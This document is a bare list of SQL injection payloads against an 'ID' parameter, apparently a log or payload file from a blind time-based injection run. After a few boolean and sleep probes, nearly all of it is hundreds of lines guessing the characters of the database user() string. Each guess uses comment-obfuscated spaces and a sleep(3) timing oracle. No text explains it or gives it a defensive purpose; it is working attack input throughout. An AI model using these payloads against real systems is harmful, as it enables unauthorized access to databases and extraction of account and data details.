ID:1
ID:1' and select 1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=2-- 
ID:1' and IF(1=1,sleep(5),2)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),28,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),29,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),30,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),31,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),32,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),33,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),34,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),35,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=103,sleep(3),0)
